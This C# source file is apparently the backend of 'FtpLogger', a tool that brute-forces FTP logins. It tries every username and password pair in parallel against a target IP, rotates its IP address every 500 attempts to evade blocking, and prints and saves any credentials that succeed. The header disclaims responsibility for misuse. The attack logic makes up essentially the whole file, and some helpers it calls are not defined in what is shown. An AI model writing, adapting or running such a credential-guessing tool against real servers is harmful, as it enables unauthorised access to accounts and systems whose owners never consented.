/*
********************************************************
Copyright © 2021 MishDotCom. All rights reserved.
Only BACKEND of application!
No ftplogger.exe shell data included!
Developer not held accountable for any misuse!
Have fun!
********************************************************
*/

using System;
using System.Threading.Tasks;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.IO;


namespace FtpLogger
{
    class FtpLoggerAttack
    {
        static void Attack(string ip, string[] usrNames, string[] passwords)
        {
            string final_ip = "ftp://" + ip;
            int total = usrNames.Length * passwords.Length;
            ParallelOptions po = new ParallelOptions();
            po.MaxDegreeOfParallelism = Environment.ProcessorCount * 1000;
            Parallel.ForEach(usrNames, po,
            (usr, state1) =>
            {
                Parallel.ForEach(passwords, po,
                (pass, state2) =>
                {
                    try
                    {
                        main_counter++;
                        temp_counter++;
                        if(temp_counter >= 500)
                        {
                            IPChanger.ChangeIP();
                            temp_counter = 0;
                        }
                        FtpWebRequest ftpRequest = (FtpWebRequest)WebRequest.Create(new Uri(final_ip));
                        if (ftpRequest.EnableSsl) 
                            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(ValidateServerCertificate);
                        ftpRequest.KeepAlive = true;
                        ftpRequest.UsePassive = true;
                        ServicePointManager.Expect100Continue = false;
                        ServicePointManager.MaxServicePointIdleTime = 0;
                        ftpRequest.Credentials = new NetworkCredential(usr, pass);
                        ftpRequest.Method = WebRequestMethods.Ftp.ListDirectory;
                        var response = (FtpWebResponse)ftpRequest.GetResponse();
                        if (response != null)
                        {
                            response.Close();
                        }
                        Console.WriteLine(response.StatusDescription + " " + response.StatusCode);
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[+]-[echo@ftplogger] ~$ Login credentials found: usr {usr} , pass {pass}");
                        if(!written_sesion)
                            WriteSession(final_ip, pass, usr, main_counter, true);
                        Console.ReadLine();
                        Environment.Exit(1);
                        state1.Break();
                        state2.Break();
                   }
                   catch(WebException ex)
                   {
                       float percent1 = percent(main_counter, total);
                       Console.WriteLine($"/> Invalid Credentials {usr} : {pass} || [{main_counter}/{total}] [{percent1}%]\n ex.Message -- " + ex.Message);  
                       if(percent1 == 100)
                       {
                           if(!written_sesion)
                                WriteSession(final_ip,"","",main_counter, false);
                            Environment.Exit(1);
                            state1.Break();
                            state2.Break();
                       }  
                   }
                });
            });
        }
    }
}
